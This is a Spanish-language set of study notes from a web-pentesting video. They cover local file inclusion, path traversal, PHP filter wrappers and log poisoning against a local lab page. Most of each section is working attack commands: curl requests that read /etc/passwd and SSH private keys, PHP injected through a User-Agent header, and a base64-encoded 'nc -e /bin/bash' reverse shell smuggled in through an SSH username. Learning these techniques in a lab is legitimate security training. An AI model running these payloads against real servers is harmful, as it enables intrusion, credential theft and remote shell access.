# notes-pentesting-web

Estas notas estan sacadas del video [Técnicas de Pentesting Web#1 (Ethical Hacking)] (https://youtu.be/roG3r5tNWOU) del genio de s4vitar


## LFI:

LFI es una vulnerabilidad que permite el acceso y lectura de archivos de un servidor y suelen combinarse con ataques del tipo de Poison Null Byte entre otras.

Para estas pruebas, se copia el contenido de la carpeta LFI en /var/www/html/ y se levanta el servicio apache2


```bash
service apache2 start
lsof -i:80
```

Con eso levantamos el apache2 y verificamos que se haya levantado en el puerto 80 por defecto.

Rutas y comandos interesantes para probar

```bash
curl -s 'localhost/example.php?file=/etc/passwd'
curl -s 'localhost/example.php?file=/etc/group'
curl -s 'localhost/example.php?file=/home/user/.ssh/id_rsa'
curl -s 'localhost/example.php?file=/proc/sched_debug'; echo 'Enumeracion de procesos'
curl -s 'localhost/example.php?file=/proc/net/fib_trie' | grep -i "host local" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u; echo 'Enumeracion de interfaces'
for port in $(curl  -s 'localhost/example.php?file=/proc/net/tcp' | awk '{print $2}' | grep -v 'local_address' | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> $(echo "ibase=16; $port" | bc)"; done; echo 'Enumeracion de puertos internos/externos'
```

### Path_transversal

../../../../../etc/passwd
Sirve para desplazarse a travez de los directorios.


## WRAPERS

Envolturas para distintos protocolos tipo URL, para trabajar con funciones del sistema. Estos pueden ser usados en distintos ataques como LFI, XXE, etc...

```bash
curl -s 'localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php' | base64 -d ;
```

## Log_Poissoning

Esta técnica es usada al poder tener acceso a un archivo log y que este sea ejecutado por el sistema, la misma permite a un atacante envenenar una request o campo para inyectar instrucciones maliciosas (ejemplo reverse shell).

Para este ejemplo se le dio acceso de lectura a www-data a los logs para que sea didactico.

#### ejemplo access.log de apache
```bash
curl -s -H "User-Agent= <?php system('whoami'); ?>" 'localhost/example.php?file=/var/log/apache2/access.log'
```

En el browser tiramos 
view-source:http://localhost/example.php?file=/var/log/apache2/access.log y abajo de todo podemos ver 'www-data'

#### ejemplo ssh

```bash
nc -lnvp 9001

echo "nc -e /bin/bash 127.0.0.1 443" | base64
> bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK
ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash"); ?>'@127.0.0.1

```
Luego de darle al ssh, necesitamos al menos tener un acceso fallido en el log y asi envenenado el log con el codigo malicioso.
En el browser tiramos http://localhost/example.php?file=/var/log/auth.log y coseguimos una reverse shell.


